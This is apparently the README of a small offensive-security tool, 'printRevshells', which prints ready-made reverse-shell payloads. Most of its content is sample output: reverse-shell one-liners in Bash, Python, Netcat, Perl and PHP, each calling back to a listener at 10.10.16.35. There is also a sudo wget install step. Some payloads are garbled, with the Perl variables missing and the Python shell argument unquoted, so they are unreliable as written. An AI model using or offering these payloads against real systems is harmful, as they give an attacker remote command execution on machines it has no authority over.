## printRevshells

### Purpose
Got sick of looking for the same payloads every time you want to pop a reverse shell? This simple script will print via the terminal the most common revshell payloads you can find on the web.

There are plenty of payloads online but this script includes:
- Bash
- Python
- Netcat
- Perl
- PHP

The script is easily customizable so you can add your own payloads aswell


### Installation
```
sudo wget https://raw.githubusercontent.com/shroudri/printRevshells/main/printRevshells -O /usr/local/bin/printRevshells
sudo chmod +x /usr/local/bin/printRevshells
username=$(whoami)
sudo chown $username /usr/local/bin/printRevshells

```


### Usage
If you have followed the installation instructions, the script will be within your PATH, so you can call it from anywhere!

Simply type `printRevshells`

Example:

```
shroudri@kali:/tmp$ printRevshells
Bash
bash -i >& /dev/tcp/10.10.16.35/9001 0>&1

Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.35",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.35",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'

Netcat
nc -e /bin/sh 10.10.16.35 9001
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.35 9001 >/tmp/f 

Perl
perl -e 'use Socket;="10.10.16.35";=9001;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in(,inet_aton()))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

PHP
php -r '$sock=fsockopen("10.10.16.35",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### - Wait! But I want to specify the port!

By default, **if no arguments are provided**, the script will use 9001 as the default port. You can customize this easily on the script.

However, if you want to specify your own port, you can execute the script as follows.
```
printRevshells 1234
```

Which generates the following output:

```
Bash
bash -i >& /dev/tcp/10.10.16.35/1234 0>&1

Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.35",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.35",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([/bin/sh,-i]);'
.....
```
